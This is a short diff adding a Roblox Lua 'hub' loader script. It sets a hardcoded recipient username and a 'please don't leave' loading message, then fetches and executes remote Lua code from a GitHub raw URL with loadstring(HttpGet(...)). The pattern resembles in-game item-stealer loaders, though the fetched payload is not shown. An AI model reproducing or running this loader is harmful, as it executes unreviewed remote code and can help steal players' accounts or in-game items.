@@ -1,0 +1,4 @@
+_G.Username = "freefire0vv"
+_G.HubName = "Project wd script are loading, please don't leave"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
